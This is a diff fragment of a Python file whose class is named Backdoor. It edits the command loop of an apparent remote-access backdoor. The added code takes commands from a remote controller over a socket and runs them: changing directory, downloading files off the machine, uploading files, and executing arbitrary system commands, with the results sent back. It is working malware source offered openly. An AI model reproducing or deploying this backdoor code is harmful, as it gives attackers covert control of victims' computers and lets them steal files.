@@ -52,35 +52,35 @@ class Backdoor:
 
     def run(self):
         while True:
-            # command = self.connection.recv(1024) # buffer size
-            # try:
-            #     command = self.reliable_recieve()
-            #     if command[0] == "exit":
-            #         self.connection.close()
-            #         sys.exit()
-            #     elif command[0] == "cd" and len(command) > 1:
-            #         command_result = self.change_working_directory_to(command[1])
-            #     elif command[0] == "download":
-            #         command_result = self.read_file(command[1])
-            #     elif command[0] == "upload":
-            #         command_result = self.write_file(command[1], command[2])
-            #     else:
-            #         command_result = self.execute_system_command(command)
-            # except Exception:
-            #     command_result = "[-] Error during command execution"
+            command = self.connection.recv(1024) # buffer size
+            try:
+                command = self.reliable_recieve()
+                if command[0] == "exit":
+                    self.connection.close()
+                    sys.exit()
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+                else:
+                    command_result = self.execute_system_command(command)
+            except Exception:
+                command_result = "[-] Error during command execution"
 
-            command = self.reliable_recieve()
-            if command[0] == "exit":
-                self.connection.close()
-                sys.exit()
-            elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_working_directory_to(command[1])
-            elif command[0] == "download":
-                command_result = self.read_file(command[1])
-            elif command[0] == "upload":
-                command_result = self.write_file(command[1], command[2])
-            else:
-                command_result = self.execute_system_command(command)
+            # command = self.reliable_recieve()
+            # if command[0] == "exit":
+            #     self.connection.close()
+            #     sys.exit()
+            # elif command[0] == "cd" and len(command) > 1:
+            #     command_result = self.change_working_directory_to(command[1])
+            # elif command[0] == "download":
+            #     command_result = self.read_file(command[1])
+            # elif command[0] == "upload":
+            #     command_result = self.write_file(command[1], command[2])
+            # else:
+            #     command_result = self.execute_system_command(command)
 
             # self.connection.send(command_result)
             self.reliable_send(command_result)
